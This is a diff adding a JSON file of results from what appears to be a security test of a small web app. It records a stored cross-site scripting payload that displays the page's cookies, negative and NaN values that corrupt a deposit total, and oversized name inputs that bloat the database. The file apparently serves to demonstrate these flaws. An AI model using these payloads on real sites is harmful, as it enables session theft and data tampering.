@@ -1,0 +1,50 @@
+{
+  "baseline": {
+    "status": 200,
+    "response": "<html><body>Welcome, Alice! (stored 5 chars)<br><a href=\"/users\">View users</a></body></html>"
+  },
+  "abuse1": {
+    "payload": "<script>document.title='XSS-EXECUTED';document.body.insertAdjacentHTML('afterbegin','<h2 style=color:red>XSS EXECUTED - attacker JS is running on this page (cookie=' + document.cookie + ')</h2>')</script>",
+    "post_status": 200,
+    "post_response": "<html><body>Welcome, <script>document.title='XSS-EXECUTED';document.body.insertAdjacentHTML('afterbegin','<h2 style=color:red>XSS EXECUTED - attacker JS is running on this page (cookie=' + document.cookie + ')</h2>')</script>! (stored 204 chars)<br><a href=\"/users\">View users</a></body></html>",
+    "raw_html_row": "<tr><td>8</td><td><script>document.title='XSS-EXECUTED';document.body.insertAdjacentHTML('afterbegin','<h2 style=color:red>XSS EXECUTED - attacker JS is running on this page (cookie=' + document.cookie + ')</h2>')</script></td><td>mallory@example.com</td><td>25</td><td>100</td></tr>",
+    "page_title_after_load": "XSS-EXECUTED"
+  },
+  "abuse2a": {
+    "payload": {
+      "age": "-5",
+      "deposit": "-1000000"
+    },
+    "post_status": 200,
+    "total_line": "Total bank deposits: -995000.0"
+  },
+  "abuse2b": {
+    "payload": {
+      "age": "abc",
+      "deposit": "NaN"
+    },
+    "post_status": 200,
+    "total_line": "Total bank deposits: nan"
+  },
+  "abuse3": {
+    "payload": "name = 'A' * 5,000,000 (sent 3 times)",
+    "post_results": [
+      {
+        "status": 200,
+        "seconds": 0.06
+      },
+      {
+        "status": 200,
+        "seconds": 0.04
+      },
+      {
+        "status": 200,
+        "seconds": 0.05
+      }
+    ],
+    "welcome_message_tail": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! (stored 5000000 chars)<br><a href=\"/users\">View users</a></body></html>",
+    "db_file_bytes": 15028224,
+    "users_page_bytes": 15000514,
+    "users_page_seconds": 0.06
+  }
+}
